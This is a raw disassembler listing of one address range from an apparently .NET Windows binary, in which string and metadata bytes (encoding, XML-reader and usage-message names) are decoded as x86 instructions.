  409c29:	dec    edi
  409c2a:	inc    ebp
  409c2b:	dec    ebp
  409c2c:	inc    ebx
  409c2d:	outs   dx,DWORD PTR ds:[esi]
  409c2e:	fs gs push eax
  409c31:	popa   
  409c32:	add    BYTE PTR gs:[bx+0x65],ah
  409c37:	je     0x409c98
  409c39:	inc    ecx
  409c3a:	dec    esi
  409c3b:	push   ebx
  409c3c:	dec    ecx
  409c3d:	inc    ebx
  409c3e:	outs   dx,DWORD PTR ds:[esi]
  409c3f:	fs gs push eax
  409c42:	popa   
  409c43:	add    BYTE PTR gs:[bx+0x65],ah
  409c48:	je     0x409ca9
  409c4a:	dec    ebp
  409c4b:	gs jae 0x409cc1
  409c4e:	popa   
  409c4f:	add    BYTE PTR gs:[bp+si+0x65],dl
  409c54:	jae    0x409cbb
  409c56:	je     0x409c9b
  409c58:	outs   dx,DWORD PTR ds:[esi]
  409c59:	ins    BYTE PTR es:[edi],dx
  409c5a:	outs   dx,DWORD PTR ds:[esi]
  409c5b:	jb     0x409c5d
  409c5d:	inc    ebp
  409c5e:	outs   dx,BYTE PTR ds:[esi]
  409c5f:	je     0x409cca
  409c61:	je     0x409cdc
  409c63:	inc    ebx
  409c64:	ins    BYTE PTR es:[edi],dx
  409c65:	popa   
  409c66:	jae    0x409cdb
  409c68:	inc    edi
  409c69:	outs   dx,BYTE PTR gs:[esi]
  409c6b:	gs jb  0x409ccf
  409c6e:	je     0x409cdf
  409c70:	jb     0x409c72
  409c72:	jae    0x409cd9
  409c74:	je     0x409cd5
  409c76:	push   ebp
  409c77:	jae    0x409cde
  409c79:	inc    esp
  409c7a:	popa   
  409c7b:	je     0x409cde
  409c7d:	push   ebx
  409c7e:	gs jb  0x409cf7
  409c81:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6f43
  409c88:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  409c8d:	outs   dx,BYTE PTR ds:[esi]
  409c8e:	add    BYTE PTR [ebx+0x79],dl
  409c91:	jae    0x409d07
  409c93:	gs ins DWORD PTR es:[edi],dx
  409c95:	cs pop eax
  409c97:	ins    DWORD PTR es:[edi],dx
  409c98:	ins    BYTE PTR es:[edi],dx
  409c99:	add    BYTE PTR [eax+0x6d],bl
  409c9c:	ins    BYTE PTR es:[edi],dx
  409c9d:	push   edx
  409c9e:	gs popa 
  409ca0:	fs gs jb 0x409cf7
  409ca4:	gs je  0x409d1b
  409ca7:	imul   ebp,DWORD PTR [esi+0x67],0x6d580073
  409cae:	ins    BYTE PTR es:[edi],dx
  409caf:	push   ebp
  409cb0:	jb     0x409d1e
  409cb2:	push   edx
  409cb3:	gs jae 0x409d25
  409cb6:	ins    BYTE PTR es:[edi],dx
  409cb7:	jbe    0x409d1e
  409cb9:	jb     0x409cbb
  409cbb:	push   ebx
  409cbc:	jns    0x409d31
  409cbe:	je     0x409d25
  409cc0:	ins    DWORD PTR es:[edi],dx
  409cc1:	cs dec esi
  409cc3:	gs je  0x409cc6
  409cc6:	inc    ebx
  409cc7:	jb     0x409d2e
  409cc9:	fs outs dx,BYTE PTR gs:[esi]
  409ccc:	je     0x409d37
  409cce:	popa   
  409ccf:	ins    BYTE PTR es:[edi],dx
  409cd0:	inc    ebx
  409cd1:	popa   
  409cd2:	arpl   WORD PTR [eax+0x65],bp
  409cd5:	add    BYTE PTR [esi+0x65],cl
  409cd8:	je     0x409d51
  409cda:	outs   dx,DWORD PTR ds:[esi]
  409cdb:	jb     0x409d48
  409cdd:	inc    ebx
  409cde:	jb     0x409d45
  409ce0:	fs outs dx,BYTE PTR gs:[esi]
  409ce3:	je     0x409d4e
  409ce5:	popa   
  409ce6:	ins    BYTE PTR es:[edi],dx
  409ce7:	add    BYTE PTR [edi+0x65],ah
  409cea:	je     0x409d4b
  409cec:	inc    esp
  409ced:	gs popaw 
  409cf0:	jne    0x409d5e
  409cf2:	je     0x409d42
  409cf4:	gs je  0x409d6e
  409cf7:	outs   dx,DWORD PTR ds:[esi]
  409cf8:	jb     0x409d65
  409cfa:	inc    ebx
  409cfb:	jb     0x409d62
  409cfd:	fs outs dx,BYTE PTR gs:[esi]
  409d00:	je     0x409d6b
  409d02:	popa   
  409d03:	ins    BYTE PTR es:[edi],dx
  409d04:	jae    0x409d06
  409d06:	pop    eax
  409d07:	ins    DWORD PTR es:[edi],dx
  409d08:	ins    BYTE PTR es:[edi],dx
  409d09:	push   edx
  409d0a:	gs jae 0x409d7c
  409d0d:	ins    BYTE PTR es:[edi],dx
  409d0e:	jbe    0x409d75
  409d10:	jb     0x409d12
  409d12:	dec    ecx
  409d13:	inc    ebx
  409d14:	jb     0x409d7b
  409d16:	fs outs dx,BYTE PTR gs:[esi]
  409d19:	je     0x409d84
  409d1b:	popa   
  409d1c:	ins    BYTE PTR es:[edi],dx
  409d1d:	jae    0x409d1f
  409d1f:	jae    0x409d86
  409d21:	je     0x409d82
  409d23:	inc    ebx
  409d24:	jb     0x409d8b
  409d26:	fs outs dx,BYTE PTR gs:[esi]
  409d29:	je     0x409d94
  409d2b:	popa   
  409d2c:	ins    BYTE PTR es:[edi],dx
  409d2d:	jae    0x409d2f
  409d2f:	jae    0x409d96
  409d31:	je     0x409d92
  409d33:	pop    eax
  409d34:	ins    DWORD PTR es:[edi],dx
  409d35:	ins    BYTE PTR es:[edi],dx
  409d36:	push   edx
  409d37:	gs jae 0x409da9
  409d3a:	ins    BYTE PTR es:[edi],dx
  409d3b:	jbe    0x409da2
  409d3d:	jb     0x409d3f
  409d3f:	pop    eax
  409d40:	ins    DWORD PTR es:[edi],dx
  409d41:	ins    BYTE PTR es:[edi],dx
  409d42:	push   edx
  409d43:	gs popa 
  409d45:	fs gs jb 0x409d49
  409d49:	inc    edi
  409d4a:	outs   dx,BYTE PTR gs:[esi]
  409d4c:	gs jb  0x409db0
  409d4f:	je     0x409db6
  409d51:	inc    ebx
  409d52:	outs   dx,DWORD PTR ds:[esi]
  409d53:	fs add BYTE PTR gs:[edi+0x65],ah
  409d58:	je     0x409db9
  409d5a:	push   ebx
  409d5b:	gs jbe 0x409dc3
  409d5e:	jb     0x409dc9
  409d60:	je     0x409ddb
  409d62:	add    BYTE PTR [ebx+0x65],dh
  409d65:	je     0x409dc6
  409d67:	inc    esi
  409d68:	outs   dx,DWORD PTR ds:[esi]
  409d69:	jb     0x409dd0
  409d6b:	addr16 jb 0x409ddd
  409d6e:	jne    0x409dde
  409d70:	fs inc ebx
  409d72:	outs   dx,DWORD PTR ds:[esi]
  409d73:	ins    BYTE PTR es:[edi],dx
  409d74:	outs   dx,DWORD PTR ds:[esi]
  409d75:	jb     0x409d77
  409d77:	addr16 gs je 0x409dda
  409d7b:	inc    esi
  409d7c:	outs   dx,DWORD PTR ds:[esi]
  409d7d:	jb     0x409de4
  409d7f:	addr16 jb 0x409df1
  409d82:	jne    0x409df2
  409d84:	fs inc ebx
  409d86:	outs   dx,DWORD PTR ds:[esi]
  409d87:	ins    BYTE PTR es:[edi],dx
  409d88:	outs   dx,DWORD PTR ds:[esi]
  409d89:	jb     0x409d8b
  409d8b:	dec    ecx
  409d8c:	outs   dx,BYTE PTR ds:[esi]
  409d8d:	je     0x409dc2
  409d8f:	xor    al,BYTE PTR [eax]
  409d91:	addr16 gs je 0x409df4
  409d95:	push   ebx
  409d96:	arpl   WORD PTR [eax+0x65],bp
  409d99:	ins    DWORD PTR es:[edi],dx
  409d9a:	popa   
  409d9b:	dec    esp
  409d9c:	outs   dx,DWORD PTR ds:[esi]
  409d9d:	arpl   WORD PTR [ecx+0x74],sp
  409da0:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  409da7:	pop    edi
  409da8:	dec    esp
  409da9:	imul   ebp,DWORD PTR [esi+0x65],0x74656700
  409db0:	pop    edi
  409db1:	inc    ebx
  409db2:	outs   dx,DWORD PTR ds:[esi]
  409db3:	ins    BYTE PTR es:[edi],dx
  409db4:	jne    0x409e23
  409db6:	outs   dx,BYTE PTR ds:[esi]
  409db7:	add    BYTE PTR [ebp+0x64],al
  409dba:	ins    DWORD PTR es:[edi],dx
  409dbb:	inc    ebp
  409dbc:	jb     0x409e30
  409dbe:	outs   dx,DWORD PTR ds:[esi]
  409dbf:	jb     0x409dc1
  409dc1:	addr16 gs je 0x409e24
  409dc5:	inc    ebx
  409dc6:	jne    0x409e3a
  409dc8:	jb     0x409e2f
  409dca:	outs   dx,BYTE PTR ds:[esi]
  409dcb:	je     0x409e10
  409dcd:	jne    0x409e3b
  409dcf:	je     0x409e46
  409dd1:	jb     0x409e38
  409dd3:	add    BYTE PTR [ecx+0x46],cl
  409dd6:	outs   dx,DWORD PTR ds:[esi]
  409dd7:	jb     0x409e46
  409dd9:	popa   
  409dda:	je     0x409e2c
  409ddc:	jb     0x409e4d
  409dde:	jbe    0x409e49
  409de0:	fs gs jb 0x409de4
  409de4:	inc    esi
  409de5:	outs   dx,DWORD PTR ds:[esi]
  409de6:	jb     0x409e55
  409de8:	popa   
  409de9:	je     0x409deb
  409deb:	push   eax
  409dec:	popa   
  409ded:	fs dec esp
  409def:	gs data16 je 0x409df3
  409df3:	inc    ebp
  409df4:	outs   dx,BYTE PTR ds:[esi]
  409df5:	jbe    0x409e60
  409df7:	jb     0x409e68
  409df9:	outs   dx,BYTE PTR ds:[esi]
  409dfa:	ins    DWORD PTR es:[edi],dx
  409dfb:	outs   dx,BYTE PTR gs:[esi]
  409dfd:	je     0x409dff
  409dff:	addr16 gs je 0x409e62
  409e03:	dec    esi
  409e04:	gs ja  0x409e53
  409e07:	imul   ebp,DWORD PTR [esi+0x65],0x63632e00
  409e0e:	je     0x409e7f
  409e10:	jb     0x409e12
  409e12:	outs   dx,DWORD PTR ds:[esi]
  409e13:	jo     0x409e74
  409e15:	dec    ecx
  409e16:	outs   dx,BYTE PTR ds:[esi]
  409e17:	gs jno 0x409e8f
  409e1a:	popa   
  409e1b:	ins    BYTE PTR es:[edi],dx
  409e1c:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x4b697255
  409e24:	imul   ebp,DWORD PTR [esi+0x64],0x73795300
  409e2b:	je     0x409e92
  409e2d:	ins    DWORD PTR es:[edi],dx
  409e2e:	cs inc esp
  409e30:	popa   
  409e31:	je     0x409e94
  409e33:	cs push ebx
  409e35:	gs jb  0x409eae
  409e38:	imul   esp,DWORD PTR [ebx+0x65],0x6c432e73
  409e3f:	imul   esp,DWORD PTR [ebp+0x6e],0x61440074
  409e46:	je     0x409ea9
  409e48:	push   ebx
  409e49:	gs jb  0x409ec2
  409e4c:	imul   esp,DWORD PTR [ebx+0x65],0x746e6f43
  409e53:	gs js  0x409eca
  409e56:	add    BYTE PTR [edi+0x65],al
  409e59:	je     0x409ea8
  409e5b:	gs je  0x409ebf
  409e5e:	fs popa 
  409e60:	je     0x409ec3
  409e62:	push   ebp
  409e63:	jb     0x409ece
  409e65:	add    BYTE PTR [ebx+0x79],dl
  409e68:	jae    0x409ede
  409e6a:	gs ins DWORD PTR es:[edi],dx
  409e6c:	cs inc ebx
  409e6e:	outs   dx,DWORD PTR ds:[esi]
  409e6f:	outs   dx,BYTE PTR ds:[esi]
  409e70:	imul   sp,WORD PTR [edi+0x75],0x6172
  409e76:	je     0x409ee1
  409e78:	outs   dx,DWORD PTR ds:[esi]
  409e79:	outs   dx,BYTE PTR ds:[esi]
  409e7a:	add    BYTE PTR [ebx+0x6f],al
  409e7d:	outs   dx,BYTE PTR ds:[esi]
  409e7e:	imul   sp,WORD PTR [edi+0x75],0x6172
  409e84:	je     0x409eef
  409e86:	outs   dx,DWORD PTR ds:[esi]
  409e87:	outs   dx,BYTE PTR ds:[esi]
  409e88:	dec    ebp
  409e89:	popa   
  409e8a:	outs   dx,BYTE PTR ds:[esi]
  409e8b:	popa   
  409e8c:	addr16 gs jb 0x409e90
  409e90:	push   ebx
  409e91:	jns    0x409f06
  409e93:	je     0x409efa
  409e95:	ins    DWORD PTR es:[edi],dx
  409e96:	cs inc ebx
  409e98:	outs   dx,DWORD PTR ds:[esi]
  409e99:	ins    BYTE PTR es:[edi],dx
  409e9a:	ins    BYTE PTR es:[edi],dx
  409e9b:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  409ea0:	outs   dx,BYTE PTR ds:[esi]
  409ea1:	jae    0x409ed1
  409ea3:	push   ebx
  409ea4:	jo     0x409f0b
  409ea6:	arpl   WORD PTR [ecx+0x61],bp
  409ea9:	ins    BYTE PTR es:[edi],dx
  409eaa:	imul   edi,DWORD PTR [edx+0x65],0x614e0064
  409eb1:	ins    DWORD PTR es:[edi],dx
  409eb2:	gs push esi
  409eb4:	popa   
  409eb5:	ins    BYTE PTR es:[edi],dx
  409eb6:	jne    0x409f1d
  409eb8:	inc    ebx
  409eb9:	outs   dx,DWORD PTR ds:[esi]
  409eba:	ins    BYTE PTR es:[edi],dx
  409ebb:	ins    BYTE PTR es:[edi],dx
  409ebc:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  409ec1:	outs   dx,BYTE PTR ds:[esi]
  409ec2:	add    BYTE PTR [edi+0x65],ah
  409ec5:	je     0x409f26
  409ec7:	inc    ecx
  409ec8:	jo     0x409f3a
  409eca:	push   ebx
  409ecb:	gs je  0x409f42
  409ece:	imul   ebp,DWORD PTR [esi+0x67],0x65470073
  409ed5:	je     0x409f1b
  409ed7:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  409ede:	jns    0x409f2e
  409ee0:	popa   
  409ee1:	ins    DWORD PTR es:[edi],dx
  409ee2:	add    BYTE PTR gs:[edi+0x65],al
  409ee6:	je     0x409f2e
  409ee8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  409ef0:	inc    ecx
  409ef1:	jb     0x409f5a
  409ef3:	jne    0x409f62
  409ef5:	outs   dx,BYTE PTR gs:[esi]
  409ef7:	je     0x409f47
  409ef9:	jne    0x409f67
  409efb:	ins    BYTE PTR es:[edi],dx
  409efc:	inc    ebp
  409efd:	js     0x409f62
  409eff:	gs jo  0x409f76
  409f02:	imul   ebp,DWORD PTR [edi+0x6e],0x67724100
  409f09:	jne    0x409f78
  409f0b:	outs   dx,BYTE PTR gs:[esi]
  409f0d:	je     0x409f5e
  409f0f:	jne    0x409f85
  409f11:	dec    edi
  409f12:	push   dx
  409f14:	popa   
  409f15:	outs   dx,BYTE PTR ds:[esi]
  409f16:	addr16 gs inc ebp
  409f19:	js     0x409f7e
  409f1b:	gs jo  0x409f92
  409f1e:	imul   ebp,DWORD PTR [edi+0x6e],0x746f4e00
  409f25:	dec    ecx
  409f26:	ins    DWORD PTR es:[edi],dx
  409f27:	jo     0x409f95
  409f29:	gs ins DWORD PTR es:[edi],dx
  409f2b:	outs   dx,BYTE PTR gs:[esi]
  409f2d:	je     0x409f94
  409f2f:	fs inc ebp
  409f31:	js     0x409f96
  409f33:	gs jo  0x409faa
  409f36:	imul   ebp,DWORD PTR [edi+0x6e],0x746f4e00
  409f3d:	push   ebx
  409f3e:	jne    0x409fb0
  409f40:	jo     0x409fb1
  409f42:	jb     0x409fb8
  409f44:	gs fs inc ebp
  409f47:	js     0x409fac
  409f49:	gs jo  0x409fc0
  409f4c:	imul   ebp,DWORD PTR [edi+0x6e],0x74657300
  409f53:	pop    edi
  409f54:	inc    esp
  409f55:	gs jae 0x409fbb
  409f58:	jb     0x409fc3
  409f5a:	jo     0x409fd0
  409f5c:	imul   ebp,DWORD PTR [edi+0x6e],0x756c6156
  409f63:	add    BYTE PTR gs:[edi+0x65],ah
  409f67:	je     0x409fc8
  409f69:	inc    ecx
  409f6a:	jae    0x409fdf
  409f6c:	gs ins DWORD PTR es:[edi],dx
  409f6e:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  409f72:	dec    ecx
  409f73:	outs   dx,BYTE PTR ds:[esi]
  409f74:	je     0x409fdb
  409f76:	jb     0x409fe4
  409f78:	outs   dx,DWORD PTR ds:[esi]
  409f79:	arpl   WORD PTR [ebx+0x65],bp
  409f7c:	add    BYTE PTR fs:[ebx+0x6f],al
  409f80:	ins    DWORD PTR es:[edi],dx
  409f81:	jo     0x409fe4
  409f83:	jb     0x409fea
  409f85:	inc    ebp
  409f86:	js     0x409feb
  409f88:	push   0x65676e61
  409f8d:	add    BYTE PTR [ecx+eiz*2+0x74],al
  409f91:	popa   
  409f92:	push   ebx
  409f93:	jbe    0x409ff8
  409f95:	push   ebp
  409f96:	je     0x40a001
  409f98:	ins    BYTE PTR es:[edi],dx
  409f99:	cs jb  0x40a001
  409f9c:	jae    0x40a00d
  409f9e:	jne    0x40a012
  409fa0:	arpl   WORD PTR [ebp+0x73],sp
  409fa3:	add    BYTE PTR [eax],al
  409fa5:	pop    es
  409fa6:	xor    DWORD PTR [eax],eax
  409fa8:	add    BYTE PTR cs:[eax],dh
  409fab:	add    BYTE PTR [eax],al
  409fad:	pop    es
  409fae:	xor    al,BYTE PTR [eax]
  409fb0:	add    BYTE PTR cs:[eax],dh
  409fb3:	add    BYTE PTR [eax],al
  409fb5:	adc    DWORD PTR [ecx],esi
  409fb7:	add    BYTE PTR [esi],ch
  409fb9:	add    BYTE PTR [eax],dh
  409fbb:	add    BYTE PTR [eax+eax*1],ch
  409fbe:	and    BYTE PTR [eax],al
  409fc0:	xor    al,BYTE PTR [eax]
  409fc2:	add    BYTE PTR cs:[eax],dh
  409fc5:	add    BYTE PTR [eax],al
  409fc7:	add    eax,0x20002c
  409fcc:	add    BYTE PTR [edi],cl
  409fce:	sub    eax,0x6f006e00
  409fd3:	add    BYTE PTR [eax+eax*1+0x6f],ch
  409fd7:	add    BYTE PTR [edi+0x0],ah
  409fda:	outs   dx,DWORD PTR ds:[esi]
  409fdb:	add    BYTE PTR [ecx],al
  409fdd:	comiss xmm0,DWORD PTR [eax]
  409fe0:	outs   dx,BYTE PTR ds:[esi]
  409fe1:	add    BYTE PTR [edi+0x0],ch
  409fe4:	ins    BYTE PTR es:[edi],dx
  409fe5:	add    BYTE PTR [edi+0x0],ch
  409fe8:	add    BYTE PTR [bx+0x0],ch
  409fec:	add    BYTE PTR [ebx],al
  409fee:	das    
  409fef:	add    BYTE PTR [eax],al
  409ff1:	add    ebp,DWORD PTR [edx]
  409ff3:	add    BYTE PTR [eax],al
  409ff5:	add    eax,0x6e0065
  409ffa:	add    BYTE PTR [ebx],ah
  409ffc:	jnp    0x409ffe
  409ffe:	xor    BYTE PTR [eax],al
  40a000:	jge    0x40a002
  40a002:	and    BYTE PTR [eax],al
  40a004:	jnp    0x40a006
  40a006:	xor    DWORD PTR [eax],eax
  40a008:	cmp    al,BYTE PTR [eax]
  40a00a:	xor    BYTE PTR [eax],al
  40a00c:	xor    BYTE PTR [eax],al
  40a00e:	xor    BYTE PTR [eax],al
  40a010:	xor    BYTE PTR [eax],al
  40a012:	jge    0x40a014
  40a014:	cmp    al,BYTE PTR [eax]
  40a016:	and    BYTE PTR [eax],al
  40a018:	jnp    0x40a01a
  40a01a:	xor    al,BYTE PTR [eax]
  40a01c:	jge    0x40a01e
  40a01e:	add    BYTE PTR [ecx+0x7b],al
  40a021:	add    BYTE PTR [eax],dh
  40a023:	add    BYTE PTR [ebp+0x0],bh
  40a026:	sub    BYTE PTR [eax],al
  40a028:	jnp    0x40a02a
  40a02a:	xor    DWORD PTR [eax],eax
  40a02c:	jge    0x40a02e
  40a02e:	sub    al,0x0
  40a030:	jnp    0x40a032
  40a032:	xor    al,BYTE PTR [eax]
  40a034:	jge    0x40a036
  40a036:	sub    DWORD PTR [eax],eax
  40a038:	and    BYTE PTR [eax],al
  40a03a:	cmp    al,BYTE PTR [eax]
  40a03c:	and    BYTE PTR [eax],al
  40a03e:	jnp    0x40a040
  40a040:	xor    eax,DWORD PTR [eax]
  40a042:	jge    0x40a044
  40a044:	and    BYTE PTR [eax],al
  40a046:	jnp    0x40a048
  40a048:	xor    al,0x0
  40a04a:	cmp    al,BYTE PTR [eax]
  40a04c:	xor    BYTE PTR [eax],al
  40a04e:	xor    BYTE PTR [eax],al
  40a050:	xor    BYTE PTR [eax],al
  40a052:	xor    BYTE PTR [eax],al
  40a054:	jge    0x40a056
  40a056:	cmp    al,BYTE PTR [eax]
  40a058:	and    BYTE PTR [eax],al
  40a05a:	jnp    0x40a05c
  40a05c:	xor    eax,0x7d00
  40a061:	pop    es
  40a062:	outs   dx,DWORD PTR ds:[esi]
  40a063:	add    BYTE PTR [ebp+0x0],dh
  40a066:	je     0x40a068
  40a068:	add    BYTE PTR ds:0x6e0069,al
  40a06e:	add    BYTE PTR [ebx],cl
  40a070:	add    BYTE PTR cs:[ebx+0x0],ah
  40a074:	jae    0x40a076
  40a076:	add    BYTE PTR fs:[eax+eax*1+0x0],ch
  40a07b:	xor    DWORD PTR [ebp+0x0],eax
  40a07e:	add    BYTE PTR fs:[ebp+0x0],ch
  40a082:	inc    edi
  40a083:	add    BYTE PTR [ebp+0x0],ah
  40a086:	outs   dx,BYTE PTR ds:[esi]
  40a087:	add    BYTE PTR [ebp+0x0],al
  40a08a:	js     0x40a08c
  40a08c:	add    BYTE PTR gs:[eax+eax*1+0x65],al
  40a091:	add    BYTE PTR [esi+0x0],ah
  40a094:	popa   
  40a095:	add    BYTE PTR [ebp+0x0],dh
  40a098:	ins    BYTE PTR es:[edi],dx
  40a099:	add    BYTE PTR [eax+eax*1+0x50],dh
  40a09d:	add    BYTE PTR [edx+0x0],dh
  40a0a0:	outs   dx,DWORD PTR ds:[esi]
  40a0a1:	add    BYTE PTR [esi+0x0],dh
  40a0a4:	imul   eax,DWORD PTR [eax],0x650064
  40a0aa:	jb     0x40a0ac
  40a0ac:	add    BYTE PTR [ebx],ch
  40a0ae:	push   ebx
  40a0af:	add    BYTE PTR [ecx+0x0],bh
  40a0b2:	jae    0x40a0b4
  40a0b4:	je     0x40a0b6
  40a0b6:	add    BYTE PTR gs:[ebp+0x0],ch
  40a0ba:	add    BYTE PTR cs:[eax+eax*1+0x61],al
  40a0bf:	add    BYTE PTR [eax+eax*1+0x61],dh
  40a0c3:	add    BYTE PTR [esi],ch
  40a0c5:	add    BYTE PTR [ebx+0x0],dl
  40a0c8:	jno    0x40a0ca
  40a0ca:	ins    BYTE PTR es:[edi],dx
  40a0cb:	add    BYTE PTR [ebx+0x0],al
  40a0ce:	ins    BYTE PTR es:[edi],dx
  40a0cf:	add    BYTE PTR [ecx+0x0],ch
  40a0d2:	add    BYTE PTR gs:[esi+0x0],ch
  40a0d6:	je     0x40a0d8
  40a0d8:	add    BYTE PTR [ebx],cl
  40a0da:	add    BYTE PTR cs:[ebp+0x0],ah
  40a0de:	add    BYTE PTR fs:[ebp+0x0],ch
  40a0e2:	js     0x40a0e4
  40a0e4:	add    BYTE PTR [edi],bl
  40a0e6:	inc    ecx
  40a0e7:	add    BYTE PTR [eax+0x0],dh
  40a0ea:	jo     0x40a0ec
  40a0ec:	ins    BYTE PTR es:[edi],dx
  40a0ed:	add    BYTE PTR [ecx+0x0],ch
  40a0f0:	arpl   WORD PTR [eax],ax
  40a0f2:	popa   
  40a0f3:	add    BYTE PTR [eax+eax*1+0x69],dh
  40a0f7:	add    BYTE PTR [edi+0x0],ch
  40a0fa:	outs   dx,BYTE PTR ds:[esi]
  40a0fb:	add    BYTE PTR [eax+eax*1+0x6f],cl
  40a0ff:	add    BYTE PTR [edi+0x0],ah
  40a102:	outs   dx,DWORD PTR ds:[esi]
  40a103:	add    BYTE PTR [eax],al
  40a105:	adc    eax,0x730055
  40a10a:	popa   
  40a10b:	add    BYTE PTR [edi+0x0],ah
  40a10e:	add    BYTE PTR gs:[eax+eax*1+0x69],dl
  40a113:	add    BYTE PTR [eax+eax*1+0x6c],dh
  40a117:	add    BYTE PTR [ebp+0x0],ah
  40a11a:	add    BYTE PTR ds:0x720057,ch
  40a120:	imul   eax,DWORD PTR [eax],0x690074
  40a126:	outs   dx,BYTE PTR ds:[esi]
  40a127:	add    BYTE PTR [edi+0x0],ah
  40a12a:	dec    edi
  40a12b:	add    BYTE PTR [edx+0x0],ah
  40a12e:	push   0x0
  40a130:	add    BYTE PTR gs:[ebx+0x0],ah
  40a134:	je     0x40a136
  40a136:	dec    esp
  40a137:	add    BYTE PTR [ecx+0x0],ah
  40a13a:	jns    0x40a13c
  40a13c:	add    BYTE PTR gs:[edx+0x0],dh
  40a140:	inc    esi
  40a141:	add    BYTE PTR [ecx+0x0],ch
  40a144:	ins    BYTE PTR es:[edi],dx
  40a145:	add    BYTE PTR [ebp+0x0],ah
  40a148:	add    BYTE PTR ds:0x650047,ah
  40a14e:	outs   dx,BYTE PTR ds:[esi]
  40a14f:	add    BYTE PTR [ebp+0x0],ah
  40a152:	jb     0x40a154
  40a154:	popa   
  40a155:	add    BYTE PTR [eax+eax*1+0x69],dh
  40a159:	add    BYTE PTR [edi+0x0],ch
  40a15c:	outs   dx,BYTE PTR ds:[esi]
  40a15d:	add    BYTE PTR [ebx+0x0],al
  40a160:	outs   dx,DWORD PTR ds:[esi]
  40a161:	add    BYTE PTR [ebp+0x0],ch
  40a164:	jo     0x40a166
  40a166:	ins    BYTE PTR es:[edi],dx
  40a167:	add    BYTE PTR [ebp+0x0],ah
  40a16a:	je     0x40a16c
  40a16c:	add    BYTE PTR gs:[eax],al
  40a16f:	sub    edx,DWORD PTR [ebp+0x0]
  40a172:	jae    0x40a174
  40a174:	popa   
  40a175:	add    BYTE PTR [edi+0x0],ah
  40a178:	add    BYTE PTR gs:[esi+0x0],cl
  40a17c:	popa   
  40a17d:	add    BYTE PTR [ebp+0x0],ch
  40a180:	add    BYTE PTR gs:[ecx+0x0],al
  40a184:	outs   dx,BYTE PTR ds:[esi]
  40a185:	add    BYTE PTR [eax+eax*1+0x56],ah
  40a189:	add    BYTE PTR [ecx+0x0],ah
  40a18c:	ins    BYTE PTR es:[edi],dx
  40a18d:	add    BYTE PTR [ebp+0x0],dh
  40a190:	add    BYTE PTR gs:[esi+0x0],cl
  40a194:	popa   
  40a195:	add    BYTE PTR [ebp+0x0],ch
  40a198:	add    BYTE PTR gs:[eax],al
  40a19b:	and    DWORD PTR [ebp+0x0],edx
  40a19e:	jae    0x40a1a0
  40a1a0:	popa   
  40a1a1:	add    BYTE PTR [edi+0x0],ah
  40a1a4:	add    BYTE PTR gs:[esi+0x0],cl
  40a1a8:	popa   
  40a1a9:	add    BYTE PTR [ebp+0x0],ch
  40a1ac:	add    BYTE PTR gs:[ecx+0x0],al
  40a1b0:	outs   dx,BYTE PTR ds:[esi]
  40a1b1:	add    BYTE PTR [eax+eax*1+0x45],ah
  40a1b5:	add    BYTE PTR [esi+0x0],ch
  40a1b8:	jne    0x40a1ba
  40a1ba:	ins    DWORD PTR es:[edi],dx
  40a1bb:	add    BYTE PTR [eax],al
  40a1bd:	cmp    DWORD PTR [ebp+0x0],edx
  40a1c0:	jae    0x40a1c2
  40a1c2:	popa   
  40a1c3:	add    BYTE PTR [edi+0x0],ah
  40a1c6:	add    BYTE PTR gs:[eax+eax*1+0x65],al
  40a1cb:	add    BYTE PTR [ebx+0x0],dh
  40a1ce:	arpl   WORD PTR [eax],ax
  40a1d0:	jb     0x40a1d2
  40a1d2:	imul   eax,DWORD PTR [eax],0x740070
  40a1d8:	imul   eax,DWORD PTR [eax],0x6e006f
  40a1de:	inc    ecx
  40a1df:	add    BYTE PTR [esi+0x0],ch
  40a1e2:	add    BYTE PTR fs:[ebx+0x0],dl
  40a1e6:	push   0x72006f00
  40a1eb:	add    BYTE PTR [eax+eax*1+0x46],dh
  40a1ef:	add    BYTE PTR [edi+0x0],ch
  40a1f2:	jb     0x40a1f4
  40a1f4:	ins    DWORD PTR es:[edi],dx
  40a1f5:	add    BYTE PTR [eax],al
  40a1f7:	daa    
  40a1f8:	push   ebp
  40a1f9:	add    BYTE PTR [ebx+0x0],dh
  40a1fc:	popa   
  40a1fd:	add    BYTE PTR [edi+0x0],ah
  40a200:	add    BYTE PTR gs:[ebp+0x0],dl
  40a204:	jb     0x40a206
  40a206:	imul   eax,DWORD PTR [eax],0x650044
  40a20c:	jae    0x40a20e
  40a20e:	arpl   WORD PTR [eax],ax
  40a210:	jb     0x40a212
  40a212:	imul   eax,DWORD PTR [eax],0x740070
  40a218:	imul   eax,DWORD PTR [eax],0x6e006f
  40a21e:	add    BYTE PTR [ecx],ch
  40a220:	push   ebp
  40a221:	add    BYTE PTR [ebx+0x0],dh
  40a224:	popa   
  40a225:	add    BYTE PTR [edi+0x0],ah
  40a228:	add    BYTE PTR gs:[eax+0x0],cl
  40a22c:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40a231:	add    BYTE PTR [eax+eax*1+0x65],al
  40a235:	add    BYTE PTR [ebx+0x0],dh
  40a238:	arpl   WORD PTR [eax],ax
  40a23a:	jb     0x40a23c
  40a23c:	imul   eax,DWORD PTR [eax],0x740070
  40a242:	imul   eax,DWORD PTR [eax],0x6e006f
  40a248:	add    BYTE PTR ds:0x730055,ch
  40a24e:	popa   
  40a24f:	add    BYTE PTR [edi+0x0],ah
  40a252:	add    BYTE PTR gs:[ecx+0x0],cl
  40a256:	outs   dx,BYTE PTR ds:[esi]
  40a257:	add    BYTE PTR [ebx+0x0],al
  40a25a:	jae    0x40a25c
  40a25c:	add    BYTE PTR fs:[eax+eax*1+0x44],ch
  40a261:	add    BYTE PTR [ebp+0x0],ah
  40a264:	jae    0x40a266
  40a266:	arpl   WORD PTR [eax],ax
  40a268:	jb     0x40a26a
  40a26a:	imul   eax,DWORD PTR [eax],0x740070
  40a270:	imul   eax,DWORD PTR [eax],0x6e006f
  40a276:	add    BYTE PTR ds:0x730055,bh
  40a27c:	popa   
  40a27d:	add    BYTE PTR [edi+0x0],ah
  40a280:	add    BYTE PTR gs:[edi+0x0],cl
